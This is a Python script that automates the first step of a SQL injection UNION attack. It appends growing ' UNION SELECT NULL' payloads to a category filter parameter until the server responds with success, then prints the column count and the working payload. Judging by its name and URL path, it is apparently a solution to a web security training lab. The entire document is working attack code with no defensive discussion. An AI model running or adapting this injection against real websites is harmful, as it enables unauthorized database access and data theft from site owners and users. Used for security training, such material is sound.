import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def noofcolumns(fullurl):
    #find no of columns
    payload = "'+UNION+SELECT"
    payload1 = "--"
    for i in range(1,10):
        if (i == 1):
            payload2 = payload + "+NULL"
        else:
            payload2 = payload2 + "," + "NULL"
        fullpayload = payload2 + payload1
        fullurlpayload = fullurl+fullpayload
        r = requests.get(fullurlpayload, verify=False, proxies=proxies)
        if r.status_code == 200:
            return i, payload2



if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        uri = '/filter?category='
        fullurl = url + uri

    except IndexError:
        print("[-] Usage: python3 determiningthenumberofcolumnsreturned.py <url>")
        print("[-] Example: python3 determiningthenumberofcolumnsreturned.py https://example.com")

    i, payload = noofcolumns(fullurl)
    print("The number of columns is:",i)
    print("The payload is:",payload)
